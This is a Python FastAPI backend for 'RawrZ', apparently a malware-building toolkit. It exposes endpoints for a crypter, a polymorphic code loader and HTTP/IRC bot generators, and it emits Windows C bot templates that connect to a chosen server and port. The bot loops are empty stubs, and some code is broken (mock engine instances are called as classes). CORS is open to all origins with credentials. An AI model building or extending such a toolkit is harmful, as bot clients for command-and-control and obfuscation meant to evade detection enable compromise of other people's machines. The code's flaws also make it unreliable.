#!/usr/bin/env python3
"""
RawrZ Python Backend Integration - Offline Desktop Support
Provides REST API for .NET desktop application
"""

import asyncio
import json
import logging
from typing import Dict, Any, Optional
from pathlib import Path
import sys
import os

# Add the current directory to Python path
sys.path.append(os.path.dirname(os.path.abspath(__file__)))

# Import existing engines
try:
    from src.engines.unified_compiler_engine import UnifiedCompilerEngine
    from src.engines.java_dotnet_unified_cryptor import JavaDotNetUnifiedCryptor
    from src.engines.advanced_polymorphic_loader import AdvancedPolymorphicLoader
    from src.engines.http_bot_generator import HttpBotGenerator
    from src.engines.irc_bot_generator import IrcBotGenerator
except ImportError as e:
    print(f"Warning: Could not import engines: {e}")
    # Create mock engines for offline mode
    class MockEngine:
        def __init__(self, name):
            self.name = name
            self.initialized = False
        
        async def initialize(self, config=None):
            self.initialized = True
        
        async def get_panel_config(self):
            return {
                'name': self.name,
                'version': '1.0.0',
                'description': f'{self.name} - Offline Mode',
                'status': {'initialized': self.initialized}
            }
    
    UnifiedCompilerEngine = MockEngine("UnifiedCompilerEngine")
    JavaDotNetUnifiedCryptor = MockEngine("JavaDotNetUnifiedCryptor")
    AdvancedPolymorphicLoader = MockEngine("AdvancedPolymorphicLoader")
    HttpBotGenerator = MockEngine("HttpBotGenerator")
    IrcBotGenerator = MockEngine("IrcBotGenerator")

# FastAPI for REST API
try:
    from fastapi import FastAPI, HTTPException
    from fastapi.middleware.cors import CORSMiddleware
    from pydantic import BaseModel
    import uvicorn
    FASTAPI_AVAILABLE = True
except ImportError:
    print("FastAPI not available, using mock server")
    FASTAPI_AVAILABLE = False

# Setup logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

class CompileRequest(BaseModel):
    sourceCode: str
    language: str
    targetType: str
    encryption: bool = False
    obfuscation: bool = False

class EncryptRequest(BaseModel):
    data: str
    method: str = "aes-256"
    key: Optional[str] = None

class BotGenerateRequest(BaseModel):
    botType: str
    server: str
    port: int
    config: Dict[str, Any] = {}

class PolymorphicRequest(BaseModel):
    sourceCode: str
    techniques: list
    options: Dict[str, Any] = {}

class RawrZDesktopBackend:
    def __init__(self):
        self.app = FastAPI(title="RawrZ Desktop Backend", version="2.0.0")
        self.engines = {}
        self.setup_cors()
        self.setup_routes()
        
    def setup_cors(self):
        """Setup CORS for .NET desktop app communication"""
        self.app.add_middleware(
            CORSMiddleware,
            allow_origins=["*"],  # Allow all origins for desktop app
            allow_credentials=True,
            allow_methods=["*"],
            allow_headers=["*"],
        )
    
    def setup_routes(self):
        """Setup all API routes"""
        
        @self.app.get("/")
        async def root():
            return {"message": "RawrZ Desktop Backend", "status": "running"}
        
        @self.app.get("/api/status")
        async def get_status():
            return {
                "status": "online",
                "engines": list(self.engines.keys()),
                "version": "2.0.0"
            }
        
        @self.app.post("/api/unified-compiler/compile")
        async def compile_code(request: CompileRequest):
            try:
                if "unified_compiler" not in self.engines:
                    await self.initialize_engine("unified_compiler")
                
                result = await self.engines["unified_compiler"].compile(
                    sourceCode=request.sourceCode,
                    options={
                        "language": request.language,
                        "targetType": request.targetType,
                        "encryption": request.encryption,
                        "obfuscation": request.obfuscation
                    }
                )
                
                return {
                    "success": True,
                    "result": result,
                    "message": "Compilation completed"
                }
            except Exception as e:
                logger.error(f"Compilation failed: {e}")
                raise HTTPException(status_code=500, detail=str(e))
        
        @self.app.post("/api/java-dotnet-cryptor/encrypt")
        async def encrypt_data(request: EncryptRequest):
            try:
                if "java_dotnet_cryptor" not in self.engines:
                    await self.initialize_engine("java_dotnet_cryptor")
                
                result = await self.engines["java_dotnet_cryptor"].encrypt(
                    data=request.data,
                    options={
                        "method": request.method,
                        "key": request.key
                    }
                )
                
                return {
                    "success": True,
                    "result": result,
                    "message": "Encryption completed"
                }
            except Exception as e:
                logger.error(f"Encryption failed: {e}")
                raise HTTPException(status_code=500, detail=str(e))
        
        @self.app.post("/api/bot-generator/generate")
        async def generate_bot(request: BotGenerateRequest):
            try:
                if request.botType.lower() == "http":
                    engine_name = "http_bot_generator"
                elif request.botType.lower() == "irc":
                    engine_name = "irc_bot_generator"
                else:
                    raise HTTPException(status_code=400, detail=f"Unsupported bot type: {request.botType}")
                
                if engine_name not in self.engines:
                    await self.initialize_engine(engine_name)
                
                # Generate bot code
                bot_code = await self.generate_bot_code(
                    request.botType,
                    request.server,
                    request.port,
                    request.config
                )
                
                return {
                    "success": True,
                    "botCode": bot_code,
                    "message": f"{request.botType} bot generated"
                }
            except Exception as e:
                logger.error(f"Bot generation failed: {e}")
                raise HTTPException(status_code=500, detail=str(e))
        
        @self.app.post("/api/polymorphic-loader/generate")
        async def generate_polymorphic(request: PolymorphicRequest):
            try:
                if "polymorphic_loader" not in self.engines:
                    await self.initialize_engine("polymorphic_loader")
                
                result = await self.engines["polymorphic_loader"].generate_polymorphic_code(
                    originalCode=request.sourceCode,
                    options={
                        "techniques": request.techniques,
                        **request.options
                    }
                )
                
                return {
                    "success": True,
                    "mutatedCode": result,
                    "message": "Polymorphic code generated"
                }
            except Exception as e:
                logger.error(f"Polymorphic generation failed: {e}")
                raise HTTPException(status_code=500, detail=str(e))
        
        @self.app.get("/api/engines")
        async def get_engines():
            """Get all available engines"""
            engines_info = {}
            for name, engine in self.engines.items():
                try:
                    engines_info[name] = await engine.get_panel_config()
                except:
                    engines_info[name] = {"name": name, "status": "error"}
            return engines_info
    
    async def initialize_engine(self, engine_name: str):
        """Initialize a specific engine"""
        try:
            if engine_name == "unified_compiler":
                engine = UnifiedCompilerEngine()
            elif engine_name == "java_dotnet_cryptor":
                engine = JavaDotNetUnifiedCryptor()
            elif engine_name == "polymorphic_loader":
                engine = AdvancedPolymorphicLoader()
            elif engine_name == "http_bot_generator":
                engine = HttpBotGenerator()
            elif engine_name == "irc_bot_generator":
                engine = IrcBotGenerator()
            else:
                raise ValueError(f"Unknown engine: {engine_name}")
            
            await engine.initialize()
            self.engines[engine_name] = engine
            logger.info(f"Engine {engine_name} initialized")
            
        except Exception as e:
            logger.error(f"Failed to initialize engine {engine_name}: {e}")
            raise
    
    async def generate_bot_code(self, bot_type: str, server: str, port: int, config: Dict[str, Any]) -> str:
        """Generate bot code for different types"""
        
        if bot_type.lower() == "http":
            return f'''#include <stdio.h>
#include <windows.h>
#include <wininet.h>

#pragma comment(lib, "wininet.lib")

int main() {{
    printf("RawrZ HTTP Bot - Connecting to {server}:{port}\\n");
    
    HINTERNET hInternet = InternetOpen("RawrZBot", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (hInternet == NULL) {{
        printf("Failed to initialize Internet connection\\n");
        return 1;
    }}
    
    HINTERNET hConnect = InternetConnect(hInternet, "{server}", {port}, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    if (hConnect == NULL) {{
        printf("Failed to connect to {server}:{port}\\n");
        InternetCloseHandle(hInternet);
        return 1;
    }}
    
    printf("Connected to {server}:{port}\\n");
    
    // Bot main loop
    while(1) {{
        // Bot operations here
        Sleep(5000);
    }}
    
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);
    return 0;
}}'''
        
        elif bot_type.lower() == "irc":
            return f'''#include <stdio.h>
#include <windows.h>
#include <winsock2.h>

#pragma comment(lib, "ws2_32.lib")

int main() {{
    printf("RawrZ IRC Bot - Connecting to {server}:{port}\\n");
    
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2,2), &wsaData) != 0) {{
        printf("WSAStartup failed\\n");
        return 1;
    }}
    
    SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock == INVALID_SOCKET) {{
        printf("Socket creation failed\\n");
        WSACleanup();
        return 1;
    }}
    
    struct sockaddr_in server;
    server.sin_family = AF_INET;
    server.sin_port = htons({port});
    server.sin_addr.s_addr = inet_addr("{server}");
    
    if (connect(sock, (struct sockaddr*)&server, sizeof(server)) == SOCKET_ERROR) {{
        printf("Failed to connect to IRC server\\n");
        closesocket(sock);
        WSACleanup();
        return 1;
    }}
    
    printf("Connected to IRC server\\n");
    
    // IRC bot main loop
    while(1) {{
        // IRC bot operations here
        Sleep(1000);
    }}
    
    closesocket(sock);
    WSACleanup();
    return 0;
}}'''
        
        else:
            return f"// RawrZ {bot_type} Bot Template\n// Server: {server}:{port}\n// Configuration: {config}"

    async def run(self, host: str = "localhost", port: int = 8080):
        """Run the backend server"""
        logger.info(f"Starting RawrZ Desktop Backend on {host}:{port}")
        
        if FASTAPI_AVAILABLE:
            config = uvicorn.Config(
                app=self.app,
                host=host,
                port=port,
                log_level="info"
            )
            server = uvicorn.Server(config)
            await server.serve()
        else:
            logger.warning("FastAPI not available, running in mock mode")
            # Mock server for testing
            await asyncio.sleep(float('inf'))

def main():
    """Main entry point"""
    backend = RawrZDesktopBackend()
    
    try:
        asyncio.run(backend.run())
    except KeyboardInterrupt:
        logger.info("RawrZ Desktop Backend stopped by user")
    except Exception as e:
        logger.error(f"Backend error: {e}")

if __name__ == "__main__":
    main()
